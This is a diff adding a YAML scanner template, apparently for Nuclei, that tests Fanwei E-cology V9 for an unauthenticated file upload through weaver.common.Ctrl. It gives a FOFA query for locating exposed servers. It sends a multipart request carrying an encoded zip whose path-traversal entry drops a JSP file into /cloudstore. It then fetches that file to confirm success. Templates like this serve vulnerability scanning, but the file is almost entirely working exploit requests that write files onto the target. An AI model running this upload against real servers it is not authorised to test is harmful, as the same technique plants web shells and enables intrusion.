@@ -1,0 +1,43 @@
+id: fanwei-e-cology-v9-weaver-common-ctrl-file-upload
+
+info:
+  name: Fanwei E-cology V9 weaver.common.Ctrl File Upload
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,fileupload
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wev8" || body="ecology" || body="e-cology" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - raw:
+      - |
+        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=16ebdb1439d842158dce3b42a88377ce
+
+        --16ebdb1439d842158dce3b42a88377ce
+        Content-Disposition: form-data; name="file1"; filename="zp857.zip"
+        Content-Type: application/zip
+
+        {{url_decode("%50%4B%03%04%14%00%00%00%08%00%B1%44%9E%53%E5%5D%4B%BC%1D%00%00%00%1D%00%00%00%12%00%00%00%2E%2E%2F%2E%2E%2F%2E%2E%2F%7A%70%38%35%37%2E%6A%73%70%B3%51%55%C8%2F%2D%D1%2B%28%CA%CC%2B%C9%C9%D3%50%AA%2A%B0%30%35%07%22%25%4D%6B%55%3B%00%50%4B%01%02%14%03%14%00%00%00%08%00%B1%44%9E%53%E5%5D%4B%BC%1D%00%00%00%1D%00%00%00%12%00%00%00%00%00%00%00%00%00%00%00%80%01%00%00%00%00%2E%2E%2F%2E%2E%2F%2E%2E%2F%7A%70%38%35%37%2E%6A%73%70%50%4B%05%06%00%00%00%00%01%00%01%00%40%00%00%00%4D%00%00%00%00%00")}}
+        --16ebdb1439d842158dce3b42a88377ce
+
+      - |
+        GET /cloudstore/zp857.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionId"
+
+      - type: word
+        words:
+          - "zp857857"
